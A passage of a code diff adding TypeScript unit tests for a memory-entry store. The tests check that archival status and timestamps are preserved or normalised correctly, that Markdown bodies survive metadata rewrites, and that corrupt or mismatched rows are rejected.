@@ -217,4 +217,956 @@ describe("applyMemoryItems", () => {
     const idx = JSON.parse(readFileSync(join(repo, ".memarium/index.memory.json"), "utf8"));
     expect(idx.entries["semantic/p/z"].trust).toBe("unknown");
   });
+
+  it("never persists caller-supplied archival lifecycle fields on the AUTHORED path (machine-maintained only)", async () => {
+    // Round-15: archivedAt/archivedReason are machine-maintained — only
+    // memory-archive sets them and only memory-unarchive clears them. The
+    // authored path (memory-write / memory-propose → memory-approve) already
+    // coerces status:"archived" back to "active" via the status allowlist, but
+    // it used to LET THE SUPPLIED LIFECYCLE VALUES THROUGH — persisting an
+    // `active` entry carrying archival metadata (and a bogus archivedReason that
+    // unarchive's superseded-cleanup logic / the cold valve's filter would later
+    // misread). Since this path can never persist status:"archived", both fields
+    // must be forced to null.
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const readIdx = () => JSON.parse(readFileSync(join(repo, ".memarium/index.memory.json"), "utf8"));
+
+    // (a) status:"archived" + both lifecycle fields supplied
+    const forged = mk({
+      id: "semantic/p/forged", type: "semantic", scope: "project:p", project: "p", path: "",
+      status: "archived" as MemoryEntry["status"],
+      archivedAt: "2026-05-01", archivedReason: "superseded-cleanup",
+    });
+    applyMemoryItems(repo, [{ entry: forged, body: "b" }]);
+    const forgedMd = readFileSync(join(repo, "memory/semantic/p/forged.md"), "utf8");
+    expect(forgedMd).toContain("status: active");
+    expect(forgedMd).toContain("archivedAt: null");
+    expect(forgedMd).toContain("archivedReason: null");
+    expect(readIdx().entries["semantic/p/forged"].status).toBe("active");
+    expect(readIdx().entries["semantic/p/forged"].archivedAt).toBe(null);
+    expect(readIdx().entries["semantic/p/forged"].archivedReason).toBe(null);
+
+    // (b) the subtler one: a plainly ACTIVE authored entry that still smuggles
+    // archival metadata past the status allowlist.
+    const smuggled = mk({
+      id: "semantic/p/smuggled", type: "semantic", scope: "project:p", project: "p", path: "",
+      status: "active", archivedAt: "2026-05-01", archivedReason: "unused-low-value",
+    });
+    applyMemoryItems(repo, [{ entry: smuggled, body: "b" }]);
+    const smuggledMd = readFileSync(join(repo, "memory/semantic/p/smuggled.md"), "utf8");
+    expect(smuggledMd).toContain("archivedAt: null");
+    expect(smuggledMd).toContain("archivedReason: null");
+    expect(readIdx().entries["semantic/p/smuggled"].archivedAt).toBe(null);
+    expect(readIdx().entries["semantic/p/smuggled"].archivedReason).toBe(null);
+  });
+
+  it("PRESERVES an existing ARCHIVED state on an authored update (never silently reactivates)", async () => {
+    // Round-19: round-15's unconditional `archivedAt = archivedReason = null`
+    // also fired when the id being written had SINCE become ARCHIVED — and since
+    // the status allowlist normalizes the authored path to "active", that write
+    // (or a queued proposal approved later) SILENTLY REACTIVATED the entry,
+    // bypassing memory-unarchive entirely. The rule is symmetric: the authored
+    // path may neither SET nor CLEAR archival lifecycle state.
+    const { applyMemoryItems, writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    const idxPath = join(repo, ".memarium/index.memory.json");
+    const readIdx = () => JSON.parse(readFileSync(idxPath, "utf8"));
+    const mdPath = join(repo, "memory/semantic/p/cold.md");
+    const base = mk({
+      id: "semantic/p/cold", type: "semantic", scope: "project:p", project: "p", path: "",
+      title: "Old title", summary: "old summary",
+    });
+
+    // 1. create it, then archive it the way memory-archive does: metadata-only
+    //    .md rewrite + the matching index row.
+    applyMemoryItems(repo, [{ entry: { ...base }, body: "original body" }]);
+    writeMemoryEntryFile(repo, {
+      ...base, path: "memory/semantic/p/cold.md",
+      status: "archived" as MemoryEntry["status"], archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+    });
+    const seeded = readIdx();
+    seeded.entries["semantic/p/cold"] = {
+      ...seeded.entries["semantic/p/cold"],
+      status: "archived", archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+    };
+    writeFileSync(idxPath, JSON.stringify(seeded));
+
+    // 2. a plain AUTHORED write to the same id — the shape memory-write / an
+    //    approved proposal produces (no status, no archival fields).
+    const update = mk({
+      id: "semantic/p/cold", type: "semantic", scope: "project:p", project: "p", path: "",
+      title: "New title", summary: "new summary",
+    });
+    delete (update as unknown as Record<string, unknown>).status;
+    applyMemoryItems(repo, [{ entry: update, body: "updated body" }]);
+
+    // CONTENT is updated normally…
+    const row = readIdx().entries["semantic/p/cold"];
+    const written = readFileSync(mdPath, "utf8");
+    expect(row.title).toBe("New title");
+    expect(row.summary).toBe("new summary");
+    expect(written).toContain("title: New title");
+    expect(written).toContain("updated body");
+    expect(written).not.toContain("original body");
+
+    // …the archival LIFECYCLE is left exactly as memory-archive set it, in BOTH stores.
+    expect(row.status).toBe("archived");
+    expect(row.archivedAt).toBe("2026-07-01");
+    expect(row.archivedReason).toBe("unused-low-value");
+    expect(written).toContain("status: archived");
+    expect(written).toContain("archivedAt: 2026-07-01");
+    expect(written).toContain("archivedReason: unused-low-value");
+  });
+
+  // Round-28: preserving status/archivedAt/archivedReason on an authored update
+  // to an ARCHIVED id is only HALF the guarantee — the round-19 branch still
+  // accepted the AUTHORED `updatedAt`. A proposal queued BEFORE the archive
+  // carries an older date, so approving it later persists an archived row whose
+  // `updatedAt` is OLDER than a sibling device's still-ACTIVE copy. Cross-device
+  // resolution is latest-wins (resolveMemoryView + the npm CI aggregator
+  // merge-books.mjs), so the ACTIVE overlay copy WINS the merge and the entry is
+  // effectively UN-ARCHIVED everywhere — exactly what round-19 exists to prevent.
+  describe("round-28: preserving an archived state never lets updatedAt REGRESS", () => {
+    const ID = "semantic/p/cold";
+    const MD = "memory/semantic/p/cold.md";
+    const idxPath = () => join(repo, ".memarium/index.memory.json");
+    const readIdx = () => JSON.parse(readFileSync(idxPath(), "utf8"));
+    const readMd = () => readFileSync(join(repo, MD), "utf8");
+
+    /** Seed the id, then archive it the way memory-archive does (metadata-only
+     *  .md rewrite + the matching index row), stamping `storedUpdatedAt`. */
+    async function seedArchived(storedUpdatedAt: string) {
+      const { applyMemoryItems, writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+      const base = mk({
+        id: ID, type: "semantic", scope: "project:p", project: "p", path: "",
+        title: "Old title", summary: "old summary", createdAt: "2026-01-01", updatedAt: "2026-01-01",
+      });
+      applyMemoryItems(repo, [{ entry: { ...base }, body: "original body" }]);
+      writeMemoryEntryFile(repo, {
+        ...base, path: MD, status: "archived" as MemoryEntry["status"],
+        archivedAt: "2026-07-01", archivedReason: "unused-low-value", updatedAt: storedUpdatedAt,
+      });
+      const seeded = readIdx();
+      seeded.entries[ID] = {
+        ...seeded.entries[ID], status: "archived", archivedAt: "2026-07-01",
+        archivedReason: "unused-low-value", updatedAt: storedUpdatedAt,
+      };
+      writeFileSync(idxPath(), JSON.stringify(seeded));
+      return applyMemoryItems;
+    }
+
+    /** The plain AUTHORED shape memory-write / an approved proposal produces. */
+    const authored = (updatedAt: unknown): MemoryEntry => {
+      const e = mk({
+        id: ID, type: "semantic", scope: "project:p", project: "p", path: "",
+        title: "New title", summary: "new summary",
+        updatedAt: updatedAt as MemoryEntry["updatedAt"],
+      });
+      delete (e as unknown as Record<string, unknown>).status;
+      return e;
+    };
+
+    it("an OLDER authored updatedAt keeps the EXISTING (newer) one — index AND .md", async () => {
+      const applyMemoryItems = await seedArchived("2026-07-10");
+      applyMemoryItems(repo, [{ entry: authored("2026-06-01"), body: "updated body" }]);
+
+      const row = readIdx().entries[ID];
+      const md = readMd();
+      // updatedAt did NOT regress…
+      expect(row.updatedAt).toBe("2026-07-10");
+      expect(md).toMatch(/^updatedAt: 2026-07-10$/m);
+      expect(md).not.toMatch(/^updatedAt: 2026-06-01$/m);
+      // …the archival lifecycle is still preserved verbatim (round-19 holds)…
+      expect(row.status).toBe("archived");
+      expect(row.archivedAt).toBe("2026-07-01");
+      expect(row.archivedReason).toBe("unused-low-value");
+      expect(md).toMatch(/^status: archived$/m);
+      expect(md).toMatch(/^archivedReason: unused-low-value$/m);
+      // …and the CONTENT update still lands.
+      expect(row.title).toBe("New title");
+      expect(md).toContain("updated body");
+    });
+
+    it("a NEWER authored updatedAt is accepted (the guard only blocks regression)", async () => {
+      const applyMemoryItems = await seedArchived("2026-07-10");
+      applyMemoryItems(repo, [{ entry: authored("2026-08-02"), body: "updated body" }]);
+
+      expect(readIdx().entries[ID].updatedAt).toBe("2026-08-02");
+      expect(readMd()).toMatch(/^updatedAt: 2026-08-02$/m);
+      expect(readIdx().entries[ID].status).toBe("archived");
+    });
+
+    it("an UNPARSEABLE authored updatedAt cannot regress the stored value", async () => {
+      // "2026-13-45" passes the YYYY-MM-DD backfill regex but Date.parse → NaN,
+      // so it is a date we cannot COMPARE. Fail closed: keep what's stored.
+      const applyMemoryItems = await seedArchived("2026-07-10");
+      applyMemoryItems(repo, [{ entry: authored("2026-13-45"), body: "updated body" }]);
+
+      expect(readIdx().entries[ID].updatedAt).toBe("2026-07-10");
+      expect(readMd()).toMatch(/^updatedAt: 2026-07-10$/m);
+      expect(readMd()).not.toContain("2026-13-45");
+    });
+
+    it("the NON-archived path is unaffected — an authored updatedAt still wins (regression lock)", async () => {
+      const { applyMemoryItems } = await import("../../src/memory/apply.js");
+      const id = "semantic/p/livedate";
+      const at = (over: Partial<MemoryEntry>) =>
+        mk({ id, type: "semantic", scope: "project:p", project: "p", path: "", ...over });
+
+      applyMemoryItems(repo, [{ entry: at({ title: "v1", updatedAt: "2026-07-10" }), body: "b1" }]);
+      applyMemoryItems(repo, [{ entry: at({ title: "v2", updatedAt: "2026-06-01" }), body: "b2" }]);
+
+      const row = readIdx().entries[id];
+      expect(row.status).toBe("active");
+      expect(row.updatedAt).toBe("2026-06-01"); // no clamp outside the archived branch
+      expect(readFileSync(join(repo, "memory/semantic/p/livedate.md"), "utf8"))
+        .toMatch(/^updatedAt: 2026-06-01$/m);
+    });
+  });
+
+  it("still nulls archival fields + normalizes status when the EXISTING row is NOT archived (round-15 holds; no forged archive)", async () => {
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const readIdx = () => JSON.parse(readFileSync(join(repo, ".memarium/index.memory.json"), "utf8"));
+    const id = "semantic/p/live";
+    const at = (over: Partial<MemoryEntry>) =>
+      mk({ id, type: "semantic", scope: "project:p", project: "p", path: "", ...over });
+
+    // seed an ACTIVE row
+    applyMemoryItems(repo, [{ entry: at({ title: "v1" }), body: "b1" }]);
+    expect(readIdx().entries[id].status).toBe("active");
+
+    // an authored update that tries to FORGE an archive on a non-archived entry
+    applyMemoryItems(repo, [{ entry: at({
+      title: "v2", status: "archived" as MemoryEntry["status"],
+      archivedAt: "2026-05-01", archivedReason: "superseded-cleanup",
+    }), body: "b2" }]);
+
+    const row = readIdx().entries[id];
+    const md = readFileSync(join(repo, "memory/semantic/p/live.md"), "utf8");
+    expect(row.title).toBe("v2");            // content still updated
+    expect(row.status).toBe("active");       // status coerced back
+    expect(row.archivedAt).toBe(null);       // supplied lifecycle values dropped
+    expect(row.archivedReason).toBe(null);
+    expect(md).toContain("status: active");
+    expect(md).toContain("archivedAt: null");
+    expect(md).toContain("archivedReason: null");
+  });
+
+  it("KEEPS an ARCHIVED supersede target archived but records archivedReason:superseded-cleanup", async () => {
+    // Round-20: round-19 made the authored path preserve archival lifecycle for
+    // the item's OWN id, but the SUPERSEDE-TARGET flip stayed unconditional — so
+    // an authored item superseding a DIFFERENT id that happened to be ARCHIVED
+    // stamped status:"superseded" over it while LEAVING its non-null
+    // archivedAt/archivedReason in place, an incoherent row.
+    //
+    // Round-25: leaving the target COMPLETELY untouched was wrong too. Its
+    // `archivedReason` drives two downstream behaviors — the cold valve keeps
+    // advertising a non-`superseded-cleanup` archive as RESTORABLE, and
+    // memory-unarchive derives the restored status from that same field — so a
+    // stale `unused-low-value` reason lets an obsolete entry come back ACTIVE
+    // next to its live replacement. The target stays ARCHIVED (no flip), but the
+    // MACHINE records the new lifecycle transition: reason → superseded-cleanup,
+    // archivedAt → today.
+    const { applyMemoryItems, writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    const today = new Date().toISOString().slice(0, 10);
+    const idxPath = join(repo, ".memarium/index.memory.json");
+    const readIdx = () => JSON.parse(readFileSync(idxPath, "utf8"));
+    const oldMdPath = join(repo, "memory/semantic/p/old.md");
+    const base = mk({
+      id: "semantic/p/old", type: "semantic", scope: "project:p", project: "p", path: "",
+      title: "Old fact",
+    });
+
+    // seed the target, then archive it the way memory-archive does (md + index row)
+    applyMemoryItems(repo, [{ entry: { ...base }, body: "old body" }]);
+    writeMemoryEntryFile(repo, {
+      ...base, path: "memory/semantic/p/old.md",
+      status: "archived" as MemoryEntry["status"], archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+    });
+    const seeded = readIdx();
+    seeded.entries["semantic/p/old"] = {
+      ...seeded.entries["semantic/p/old"],
+      status: "archived", archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+    };
+    writeFileSync(idxPath, JSON.stringify(seeded));
+
+    // an authored write that supersedes the ARCHIVED target
+    const r = applyMemoryItems(repo, [{
+      entry: mk({
+        id: "semantic/p/new", type: "semantic", scope: "project:p", project: "p", path: "",
+        title: "New fact", supersedes: "semantic/p/old",
+      }),
+      body: "new body",
+    }]);
+
+    // still archived (never flipped) — but the reason now records THIS transition,
+    // in BOTH stores
+    const target = readIdx().entries["semantic/p/old"];
+    const targetMd = readFileSync(oldMdPath, "utf8");
+    expect(target.status).toBe("archived");
+    expect(target.archivedReason).toBe("superseded-cleanup");
+    expect(target.archivedAt).toBe(today);
+    expect(targetMd).toMatch(/^status: archived$/m);
+    expect(targetMd).toMatch(/^archivedReason: superseded-cleanup$/m);
+    expect(targetMd).toMatch(new RegExp(`^archivedAt: ${today}$`, "m"));
+    expect(targetMd).not.toMatch(/^status: superseded$/m);
+    expect(targetMd).not.toContain("unused-low-value");
+    // …and no status flip is reported, because none happened
+    expect(r.superseded).toBe(0);
+    // the superseding entry itself is written normally
+    expect(readIdx().entries["semantic/p/new"].status).toBe("active");
+  });
+
+  it("ADVANCES the target's updatedAt with the recorded transition, so latest-wins propagates it cross-device (and stays idempotent)", async () => {
+    // Round-26: recording `superseded-cleanup` is only half the fix. Cross-device
+    // resolution (resolveMemoryView, and the npm CI aggregator merge-books.mjs)
+    // picks between two copies of an id by `updatedAt` — LATEST WINS. Stamping the
+    // new reason WITHOUT advancing updatedAt leaves this copy losing to a sibling
+    // device's older-reason copy, which keeps advertising the obsolete entry as
+    // restorable (and restorable to ACTIVE) there. So the transition must move
+    // updatedAt to the same "now" as the archivedAt stamp — in BOTH stores, the way
+    // memory-archive / memory-unarchive already stamp updatedAt on a status change.
+    const { applyMemoryItems, writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    const today = new Date().toISOString().slice(0, 10);
+    const idxPath = join(repo, ".memarium/index.memory.json");
+    const readIdx = () => JSON.parse(readFileSync(idxPath, "utf8"));
+    const oldMdPath = join(repo, "memory/semantic/p/old.md");
+    const base = mk({
+      id: "semantic/p/old", type: "semantic", scope: "project:p", project: "p", path: "",
+      title: "Old fact", createdAt: "2026-01-01", updatedAt: "2026-01-01",
+    });
+
+    // seed + archive the target the way memory-archive does, with a STALE updatedAt
+    applyMemoryItems(repo, [{ entry: { ...base }, body: "old body" }]);
+    writeMemoryEntryFile(repo, {
+      ...base, path: "memory/semantic/p/old.md",
+      status: "archived" as MemoryEntry["status"], archivedAt: "2026-07-01",
+      archivedReason: "unused-low-value", updatedAt: "2026-01-01",
+    });
+    const seeded = readIdx();
+    seeded.entries["semantic/p/old"] = {
+      ...seeded.entries["semantic/p/old"],
+      status: "archived", archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+      updatedAt: "2026-01-01",
+    };
+    writeFileSync(idxPath, JSON.stringify(seeded));
+    expect(readIdx().entries["semantic/p/old"].updatedAt).toBe("2026-01-01");
+
+    const superseder = () => ({
+      entry: mk({
+        id: "semantic/p/new", type: "semantic", scope: "project:p", project: "p", path: "",
+        title: "New fact", supersedes: "semantic/p/old",
+      }),
+      body: "new body",
+    });
+    applyMemoryItems(repo, [superseder()]);
+
+    // the transition stamp and updatedAt move TOGETHER, in the index AND the .md
+    const target = readIdx().entries["semantic/p/old"];
+    expect(target.archivedReason).toBe("superseded-cleanup");
+    expect(target.archivedAt).toBe(today);
+    expect(target.updatedAt).toBe(today);
+    const md = readFileSync(oldMdPath, "utf8");
+    expect(md).toMatch(new RegExp(`^updatedAt: ${today}$`, "m"));
+    expect(md).toMatch(new RegExp(`^archivedAt: ${today}$`, "m"));
+    expect(md).not.toMatch(/^updatedAt: 2026-01-01$/m);
+
+    // IDEMPOTENCE: a re-run (digest re-applies the same item) must NOT restamp.
+    // Park a sentinel updatedAt on both stores so a second stamp would be visible
+    // even though "now" hasn't changed, then apply the identical item again.
+    const parked = readIdx();
+    parked.entries["semantic/p/old"].updatedAt = "2030-12-31";
+    writeFileSync(idxPath, JSON.stringify(parked));
+    writeFileSync(oldMdPath, md.replace(/^updatedAt: .*$/m, "updatedAt: 2030-12-31"));
+
+    applyMemoryItems(repo, [superseder()]);
+
+    const after = readIdx().entries["semantic/p/old"];
+    expect(after.updatedAt).toBe("2030-12-31");           // untouched — no churn
+    expect(after.archivedAt).toBe(today);                 // stamp unchanged too
+    expect(after.archivedReason).toBe("superseded-cleanup");
+    expect(readFileSync(oldMdPath, "utf8")).toMatch(/^updatedAt: 2030-12-31$/m);
+  });
+
+  it("the recorded superseded-cleanup makes the target NON-RESURRECTABLE by the cold valve", async () => {
+    // The whole point of recording the reason: the R2 cold valve's
+    // NON_RESURRECTABLE_REASONS filter keys off `archivedReason`, so a stale
+    // `unused-low-value` on a now-superseded entry kept advertising it as
+    // restorable. Prove the SAME index row flips from surfaced → excluded across
+    // the supersede.
+    const { applyMemoryItems, writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    const { runColdPass } = await import("../../src/memory/cold-pass.js");
+    const idxPath = join(repo, ".memarium/index.memory.json");
+    const readIdx = () => JSON.parse(readFileSync(idxPath, "utf8"));
+    const base = mk({
+      id: "semantic/p/vim", type: "semantic", scope: "project:p", project: "p", path: "",
+      title: "Vim keybindings", summary: "vim editor setup",
+    });
+    applyMemoryItems(repo, [{ entry: { ...base }, body: "old body" }]);
+    writeMemoryEntryFile(repo, {
+      ...base, path: "memory/semantic/p/vim.md",
+      status: "archived" as MemoryEntry["status"], archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+    });
+    const seeded = readIdx();
+    seeded.entries["semantic/p/vim"] = {
+      ...seeded.entries["semantic/p/vim"],
+      status: "archived", archivedAt: "2026-07-01", archivedReason: "unused-low-value",
+    };
+    writeFileSync(idxPath, JSON.stringify(seeded));
+
+    const coldPass = () => {
+      const entries = readIdx().entries as Record<string, MemoryEntry>;
+      return runColdPass({
+        entries, scored: [],
+        query: { project: "p", text: "vim", type: null, now: "2026-07-10" },
+        sources: Object.fromEntries(Object.keys(entries).map((k) => [k, "local" as const])),
+      });
+    };
+
+    // BEFORE: archived as unused-low-value → a resurrectable cold hit
+    expect(coldPass().map((c) => c.id)).toContain("semantic/p/vim");
+
+    applyMemoryItems(repo, [{
+      entry: mk({
+        id: "semantic/p/vim2", type: "semantic", scope: "project:p", project: "p", path: "",
+        title: "Vim keybindings", summary: "vim editor setup", supersedes: "semantic/p/vim",
+      }),
+      body: "new body",
+    }]);
+
+    // AFTER: recorded as superseded-cleanup → the valve must not advertise it
+    expect(coldPass().map((c) => c.id)).not.toContain("semantic/p/vim");
+  });
+
+  it("regression: superseding a NORMAL ACTIVE target still flips it, archival fields untouched", async () => {
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const readIdx = () => JSON.parse(readFileSync(join(repo, ".memarium/index.memory.json"), "utf8"));
+    applyMemoryItems(repo, [{
+      entry: mk({ id: "semantic/p/old", type: "semantic", scope: "project:p", project: "p", path: "", title: "old" }),
+      body: "old body",
+    }]);
+    const r = applyMemoryItems(repo, [{
+      entry: mk({
+        id: "semantic/p/new", type: "semantic", scope: "project:p", project: "p", path: "",
+        title: "new", supersedes: "semantic/p/old",
+      }),
+      body: "new body",
+    }]);
+    const target = readIdx().entries["semantic/p/old"];
+    const md = readFileSync(join(repo, "memory/semantic/p/old.md"), "utf8");
+    expect(target.status).toBe("superseded");
+    expect(target.archivedAt).toBe(null);
+    expect(target.archivedReason).toBe(null);
+    expect(md).toMatch(/^status: superseded$/m);
+    expect(md).toContain("archivedAt: null");
+    expect(md).toContain("archivedReason: null");
+    expect(r.superseded).toBe(1);
+  });
+});
+
+describe("writeMemoryEntryFile (metadata-only rewriter)", () => {
+  let home: string, repo: string;
+  beforeEach(() => {
+    home = mkdtempSync(join(tmpdir(), "vbp-writefile-"));
+    vi.stubEnv("HOME", home);
+    vi.resetModules();
+    repo = join(home, ".memarium/session-repo");
+    mkdirSync(join(repo, ".memarium"), { recursive: true });
+  });
+  afterEach(() => { vi.unstubAllEnvs(); rmSync(home, { recursive: true, force: true }); });
+
+  it("preserves the body cleanly on a CRLF (Windows) checkout — no old frontmatter/heading leaks in", async () => {
+    const { writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    // Seed the canonical .md with CRLF line endings + an OLD (archived) frontmatter
+    // and heading. A non-CRLF-safe body strip would fail to match `---\n...\n---`
+    // and embed the entire old frontmatter + "# Old heading" into the rewritten body.
+    const rel = "memory/semantic/p/crlf.md";
+    const abs = join(repo, rel);
+    mkdirSync(join(repo, "memory/semantic/p"), { recursive: true });
+    const crlf = [
+      "---", "id: semantic/p/crlf", "type: semantic", "status: archived",
+      "archivedReason: expired", "---", "", "# Old heading",
+      "", "The real body line one.", "Second body line.", "",
+    ].join("\r\n");
+    writeFileSync(abs, crlf);
+
+    // Rewrite it back to ACTIVE (the unarchive/archive metadata flip path).
+    const entry = mk({
+      id: "semantic/p/crlf", type: "semantic", scope: "project:p", project: "p",
+      title: "Restored title", status: "active", path: "",
+    });
+    writeMemoryEntryFile(repo, entry);
+
+    const written = readFileSync(abs, "utf8");
+    expect(written).toContain("The real body line one.");   // body preserved…
+    expect(written).toContain("Second body line.");
+    expect(written).not.toContain("# Old heading");          // …without the old heading…
+    expect(written).not.toContain("status: archived");       // …or the old archived frontmatter leaking in
+    expect(written).not.toContain("archivedReason: expired");
+  });
+
+  it("preserves an indented Markdown code block's leading spaces across an archive→unarchive round-trip (no .trim() de-indent)", async () => {
+    const { writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    // A body that OPENS with a 4-space-indented fenced code block. The first
+    // line's leading spaces are load-bearing Markdown (they make it a code block).
+    // A `.trim()` in body recovery would strip them on every metadata-only rewrite.
+    const rel = "memory/semantic/p/indent.md";
+    const abs = join(repo, rel);
+    mkdirSync(join(repo, "memory/semantic/p"), { recursive: true });
+    const indentedBody = "    ```sh\n    npm run build\n    ```\n\nTrailing prose.";
+    const seedMd =
+      "---\nid: semantic/p/indent\ntype: semantic\nstatus: active\narchivedAt: null\narchivedReason: null\n---\n\n# Indented\n\n" +
+      indentedBody + "\n";
+    writeFileSync(abs, seedMd);
+
+    const entry = mk({
+      id: "semantic/p/indent", type: "semantic", scope: "project:p", project: "p",
+      title: "Indented", status: "active", path: "",
+    });
+
+    // archive flip (metadata-only rewrite recovers + re-emits the body)…
+    writeMemoryEntryFile(repo, { ...entry, status: "archived", archivedAt: "2026-07-01", archivedReason: "unused-low-value" });
+    // …then unarchive flip (a second recovery + re-emit).
+    writeMemoryEntryFile(repo, { ...entry, status: "active" });
+
+    const written = readFileSync(abs, "utf8");
+    // The indentation of BOTH the opening fence and the code line survived intact.
+    expect(written).toContain("    ```sh\n    npm run build\n    ```");
+    expect(written).toContain("Trailing prose.");
+  });
+
+  it("rejects a .md whose first heading is a body ## (no canonical # title) — must not pass preflight", async () => {
+    const { assertMemoryBodyRecoverable } = await import("../../src/memory/apply.js");
+    mkdirSync(join(repo, "memory/semantic/p"), { recursive: true });
+    // frontmatter is valid, but the body opens with an H2 section — no `# Title` H1.
+    writeFileSync(join(repo, "memory/semantic/p/noh1.md"),
+      "---\nid: semantic/p/noh1\ntype: semantic\nstatus: active\n---\n\n## Section\n\nbody text\n");
+    const entry = mk({ id: "semantic/p/noh1", type: "semantic", scope: "project:p", project: "p",
+      title: "NoH1", status: "active", path: "" });
+    expect(() => assertMemoryBodyRecoverable(repo, entry)).toThrow(/# heading/);
+  });
+
+  it("strips only the H1 title, preserving a later ## body heading across a rewrite", async () => {
+    const { writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    mkdirSync(join(repo, "memory/semantic/p"), { recursive: true });
+    writeFileSync(join(repo, "memory/semantic/p/sub.md"),
+      "---\nid: semantic/p/sub\ntype: semantic\nstatus: active\n---\n\n# Title\n\nintro\n\n## Subsection\n\nmore\n");
+    const entry = mk({ id: "semantic/p/sub", type: "semantic", scope: "project:p", project: "p",
+      title: "Title", status: "active", path: "" });
+    writeMemoryEntryFile(repo, { ...entry, status: "archived", archivedAt: "2026-07-01", archivedReason: "expired" });
+    const written = readFileSync(join(repo, "memory/semantic/p/sub.md"), "utf8");
+    expect(written).toContain("## Subsection"); // body heading preserved (not deleted as the title)
+    expect(written).toContain("intro");
+  });
+
+  it("aborts (throws, leaves the file untouched) when the persisted .md id differs from the entry — identity guard", async () => {
+    // A structurally-valid .md whose frontmatter id belongs to a DIFFERENT entry is
+    // sitting at the canonical path derived from `entry`. Without an identity check,
+    // a metadata-only rewrite would overwrite that other entry's record with THIS
+    // index row — turning store corruption into silent cross-entry data loss during
+    // automatic archival. The strict rewriter must throw before any write.
+    const { writeMemoryEntryFile, assertMemoryBodyRecoverable } = await import("../../src/memory/apply.js");
+    mkdirSync(join(repo, "memory/semantic/p"), { recursive: true });
+    const abs = join(repo, "memory/semantic/p/mine.md");
+    // canonical path for id "semantic/p/mine" holds a .md that claims id "semantic/p/OTHER".
+    const foreign = "---\nid: semantic/p/OTHER\ntype: semantic\nstatus: active\n---\n\n# Other entry\n\nSomeone else's body.\n";
+    writeFileSync(abs, foreign);
+    const entry = mk({ id: "semantic/p/mine", type: "semantic", scope: "project:p", project: "p",
+      title: "Mine", status: "archived", archivedAt: "2026-07-01", archivedReason: "expired", path: "" });
+    // both the batch preflight and the single-entry writer must reject it
+    expect(() => assertMemoryBodyRecoverable(repo, entry)).toThrow(/identity mismatch|different id/i);
+    expect(() => writeMemoryEntryFile(repo, entry)).toThrow(/identity mismatch|different id/i);
+    expect(readFileSync(abs, "utf8")).toBe(foreign); // original file byte-identical, never clobbered
+  });
+
+  it("aborts when the persisted .md type differs from the entry — identity guard (type)", async () => {
+    const { writeMemoryEntryFile } = await import("../../src/memory/apply.js");
+    mkdirSync(join(repo, "memory/semantic/p"), { recursive: true });
+    const abs = join(repo, "memory/semantic/p/t.md");
+    // same id, but the persisted type is procedural while the entry says semantic.
+    const foreign = "---\nid: semantic/p/t\ntype: procedural\nstatus: active\n---\n\n# T\n\nbody\n";
+    writeFileSync(abs, foreign);
+    const entry = mk({ id: "semantic/p/t", type: "semantic", scope: "project:p", project: "p",
+      title: "T", status: "archived", archivedAt: "2026-07-01", archivedReason: "expired", path: "" });
+    expect(() => writeMemoryEntryFile(repo, entry)).toThrow(/identity mismatch|different type/i);
+    expect(readFileSync(abs, "utf8")).toBe(foreign);
+  });
+});
+
+describe("missingRewriteField — COLLECTION fields the renderer joins", () => {
+  // Round-16: the rewrite gate validated only SCALAR fields, so a superseded row
+  // carrying `sourceSessions: "s1"` (a STRING, not an array) passed, was planned
+  // for archival, and then renderMemoryMarkdown called `.join()` on it — throwing
+  // mid-run inside the AUTOMATIC digest consolidation (no human in the loop).
+  // The gate must reject any collection field that isn't an array.
+  const complete = (): MemoryEntry => mk({
+    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T",
+  });
+  const COLLECTIONS = ["sourceSessions", "sourceCommits", "sourceFiles", "entities"] as const;
+
+  it("accepts a complete row (control)", async () => {
+    const { missingRewriteField } = await import("../../src/memory/apply.js");
+    expect(missingRewriteField(complete())).toBeNull();
+  });
+
+  it("rejects a non-array collection field, naming it — and that row really would crash the renderer", async () => {
+    const { missingRewriteField } = await import("../../src/memory/apply.js");
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    for (const field of COLLECTIONS) {
+      for (const bad of ["s1", 42, { a: 1 }]) {
+        const row = { ...complete(), [field]: bad } as unknown as MemoryEntry;
+        expect(missingRewriteField(row)).toBe(field);
+        // proof the gate is load-bearing: the renderer genuinely throws on this row
+        expect(() => renderMemoryMarkdown(row, "body")).toThrow(TypeError);
+      }
+    }
+  });
+
+  it("tolerates an UNSET collection field (undefined / null) — the renderer coerces it to []", async () => {
+    const { missingRewriteField } = await import("../../src/memory/apply.js");
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    for (const field of COLLECTIONS) {
+      for (const unset of [undefined, null]) {
+        const row = { ...complete(), [field]: unset } as unknown as MemoryEntry;
+        expect(missingRewriteField(row)).toBeNull();
+        expect(renderMemoryMarkdown(row, "body")).toContain(`${field}: []`);
+      }
+    }
+  });
+});
+
+describe("missingRewriteField — round-22: the row's CANONICAL PATH must be derivable", () => {
+  // Round-22: every scalar can be a non-empty string and every collection an
+  // array, and the row can STILL be un-rewritable — those fields are only
+  // INGREDIENTS for the canonical path the rewriter derives from them. A row with
+  // `project: "../x"`, or an `id` whose slug segment is "..", passed the whole
+  // gate, got PLANNED by memory-archive, and then threw out of
+  // `canonicalMemoryPath` inside `assertMemoryBodyRecoverable`'s whole-plan
+  // preflight — aborting the entire UNATTENDED digest consolidation. Same class
+  // as round-16: a corrupt row must be SKIPPED and COUNTED, never allowed to
+  // crash the run.
+  const complete = (over: Partial<MemoryEntry> = {}): MemoryEntry => mk({
+    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T", ...over,
+  });
+
